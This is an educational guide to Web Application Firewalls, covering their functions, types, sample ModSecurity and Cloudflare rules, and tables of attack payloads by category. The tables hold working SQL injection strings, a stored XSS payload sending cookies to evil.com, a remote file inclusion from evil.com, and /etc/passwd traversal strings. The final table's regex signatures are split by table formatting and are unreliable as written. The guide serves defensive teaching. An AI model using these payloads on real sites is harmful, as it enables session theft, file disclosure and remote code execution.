


#### 🔐 What is a WAF (Web Application Firewall)?

A **WAF (Web Application Firewall)** is a **security solution** that **monitors, filters, and blocks HTTP/HTTPS traffic** to and from a web application. It helps protect web applications from **common attacks** such as:

* 🩸 **SQL Injection**
* 🖼️ **Cross-Site Scripting (XSS)**
* 🔗 **Cross-Site Request Forgery (CSRF)**
* 📂 **File Inclusion (LFI/RFI)**
* 🚪 **Directory Traversal**
* ⚙️ **Security Misconfigurations**
* 🔓 **Authentication bypasses, session hijacking, etc.**

---

## 🛡️ Key Functions of a WAF

| Function                 | Description                                                                |
| ------------------------ | -------------------------------------------------------------------------- |
| **Traffic Inspection**   | Analyzes incoming/outgoing HTTP(S) traffic.                                |
| **Rule Enforcement**     | Applies policies/rules (e.g., OWASP Top 10).                               |
| **Attack Blocking**      | Detects and blocks malicious patterns (e.g., `<script>`, `../etc/passwd`). |
| **Rate Limiting**        | Prevents DDoS or brute-force attempts.                                     |
| **Logging & Monitoring** | Logs attacks and helps in incident analysis.                               |
| **Virtual Patching**     | Protects apps even before underlying code is fixed.                        |

---

## 📌 Types of WAF

| Type              | Description                    | Example                                         |
| ----------------- | ------------------------------ | ----------------------------------------------- |
| **Network-based** | Deployed as hardware appliance | F5 BIG-IP ASM, Fortinet FortiWeb                |
| **Host-based**    | Runs on web server itself      | ModSecurity (Apache/Nginx)                      |
| **Cloud-based**   | Delivered as a service         | AWS WAF, Azure WAF, Cloudflare, Akamai, Imperva |

---

## 🎯 Why is WAF Important?

* Protects against **OWASP Top 10 vulnerabilities**
* Provides **layer 7 security** (HTTP/HTTPS)
* Helps achieve **compliance** (e.g., PCI-DSS, GDPR)
* Acts as a **first line of defense** for internet-facing apps

---

## 📊 Where Does WAF Fit in the Security Architecture?

```
Client ↔ CDN ↔ WAF ↔ Load Balancer ↔ Web Server ↔ Application
```
---
#### 🔍 Comparison: WAF vs Firewall vs IPS

| Feature                       | **WAF** (Web Application Firewall)        | **Firewall** (Network Firewall)   | **IPS** (Intrusion Prevention System)      |
| ----------------------------- | ----------------------------------------- | --------------------------------- | ------------------------------------------ |
| 🔒 **Layer**                  | OSI Layer 7 (Application)                 | OSI Layer 3–4 (Network/Transport) | OSI Layer 3–7 (Network–App, depending)     |
| 🎯 **Focus**                  | Web application threats                   | Network-level threats (IP, port)  | Signature/anomaly-based threat detection   |
| 🧠 **Understands HTTP/HTTPS** | Yes (parses cookies, headers, body, etc.) | No                                | Some (deep packet inspection)              |
| 🛑 **Blocks**                 | SQLi, XSS, CSRF, LFI, etc.                | Port scans, IP spoofing, DoS      | Malware, exploits, worms, buffer overflows |
| 📚 **Typical Rules**          | OWASP Top 10                              | IP-based ACLs, port filters       | Signature-based (e.g., Snort)              |
| 🏗️ **Deployment Point**      | In front of web servers                   | At network perimeter or gateway   | Between firewall and internal network      |
| 💡 **Best For**               | Web apps, APIs, portals                   | Basic perimeter security          | Detecting known vulnerabilities            |

---

## 🛠️ Sample WAF Rules

### ✅ Sample **ModSecurity (Apache/Nginx)** Rule: Block SQL Injection

```apache
SecRule REQUEST_URI|ARGS|REQUEST_HEADERS "@rx (\bUNION\b|\bSELECT\b|\bINSERT\b|\bDELETE\b|\bUPDATE\b|\bDROP\b)" \
"id:10001,phase:2,t:none,block,msg:'SQL Injection Attempt Detected'"
```

### ✅ Block XSS Attempts

```apache
SecRule REQUEST_URI|ARGS|REQUEST_HEADERS "@rx <script|onerror=|alert\(" \
"id:10002,phase:2,t:none,block,msg:'XSS Attack Detected'"
```

---

### ✅ Sample **Cloudflare WAF Rule** (Expression-based)

#### Block request with SQL Injection pattern

```json
{
  "expression": "(http.request.uri.query contains \"UNION SELECT\")",
  "action": "block",
  "description": "Block SQLi attempt in URI",
  "enabled": true
}
```

#### Block all access to admin panel except from internal IP

```json
{
  "expression": "(http.request.uri.path contains \"/admin\") and not ip.src in {198.51.100.0/24}",
  "action": "block",
  "description": "Restrict /admin to internal IPs",
  "enabled": true
}
```

#### Challenge suspicious user-agents

```json
{
  "expression": "(http.user_agent contains \"curl\" or http.user_agent contains \"sqlmap\")",
  "action": "challenge",
  "description": "Challenge bad bots",
  "enabled": true
}
```

---

## 🛡️ WAF Attack Examples by Category

### 🔍 1. **SQL Injection (SQLi)**

> Exploits web input to manipulate SQL queries.

| Type                      | Example Payload                              | Description                      |
| ------------------------- | -------------------------------------------- | -------------------------------- |
| **Classic SQLi**          | `admin' OR '1'='1`                           | Bypasses login auth logic.       |
| **Union-Based SQLi**      | `' UNION SELECT null, version() -- `         | Dumps DB version.                |
| **Error-Based SQLi**      | `' AND 1=CONVERT(int, (SELECT @@version))--` | Triggers DB error leak.          |
| **Blind SQLi**            | `' AND SUBSTRING(@@version,1,1)='M' --`      | Time/data inference.             |
| **Time-Based Blind SQLi** | `' OR IF(1=1, SLEEP(5), 0) -- `              | Measures delay to infer success. |

---

### 💉 2. **Cross-Site Scripting (XSS)**

> Injects malicious JS into a trusted site.

| Type              | Example Payload                                                                     | Description                   |
| ----------------- | ----------------------------------------------------------------------------------- | ----------------------------- |
| **Reflected XSS** | `?q=<script>alert(1)</script>`                                                      | In URL, triggers in response. |
| **Stored XSS**    | Post a comment: `<script>fetch('http://evil.com?cookie='+document.cookie)</script>` | Stored in DB.                 |
| **DOM-based XSS** | `#<img src=x onerror=alert(1)>`                                                     | Triggers via client-side JS.  |

---

### 🌀 3. **Cross-Site Request Forgery (XSRF/CSRF)**

> Tricks users into performing actions unknowingly.

| Type              | Example Scenario                           | Malicious Code                                                 |
| ----------------- | ------------------------------------------ | -------------------------------------------------------------- |
| **CSRF via GET**  | Auto-transfer money when user clicks image | `<img src="https://bank.com/transfer?amount=10000&to=hacker">` |
| **CSRF via POST** | Submits a hidden form from attacker site   | Auto-submitting HTML form targeting user session.              |

---

### 🗂️ 4. **File Inclusion (LFI / RFI)**

> Includes unintended files in web apps.

| Type                            | Example Payload                  | Description                                  |
| ------------------------------- | -------------------------------- | -------------------------------------------- |
| **Local File Inclusion (LFI)**  | `page=../../../../etc/passwd`    | Reads local system files.                    |
| **Remote File Inclusion (RFI)** | `page=http://evil.com/shell.txt` | Executes remote malicious code (PHP mostly). |
| **Null Byte Injection**         | `?file=../../etc/passwd%00.php`  | Bypasses file extension filter (older PHP).  |

---

### 🔓 5. **Web Security Misconfiguration**

> Weak defaults, verbose errors, insecure files exposed.

| Type                         | Example / Symptom                 | Description                                   |
| ---------------------------- | --------------------------------- | --------------------------------------------- |
| **Directory Traversal**      | `../../../etc/shadow`             | Reads unauthorized files.                     |
| **Exposed Admin Interfaces** | `/admin`, `/phpmyadmin`           | Access to restricted pages.                   |
| **Verbose Error Messages**   | `?id='` → `SQL syntax error`      | Leaks tech stack or DB structure.             |
| **Default Credentials**      | `admin/admin` on login page       | Forgotten default passwords.                  |
| **Open Directories**         | `http://site.com/uploads/`        | Lists sensitive or uploaded files.            |
| **Missing Security Headers** | No `X-Frame-Options`, `CSP`, etc. | Vulnerable to clickjacking, script injection. |

---

## ✅ Bonus: Common WAF Rules to Detect These

| Attack Type         | WAF Signature Example                                 |                    |               |
| ------------------- | ----------------------------------------------------- | ------------------ | ------------- |
| SQLi                | \`(?i)(union(.\*)select                               | select(.\*)from)\` |               |
| XSS                 | \`<script>                                            | onerror=           | alert(\`      |
| CSRF                | Detects cross-origin `Referer` with sensitive actions |                    |               |
| LFI                 | \`../                                                 | ..\\               | /etc/passwd\` |
| RFI                 | `http[s]?://` in GET param                            |                    |               |
| Directory Traversal | \`/../                                                | /etc/passwd\`      |               |

---


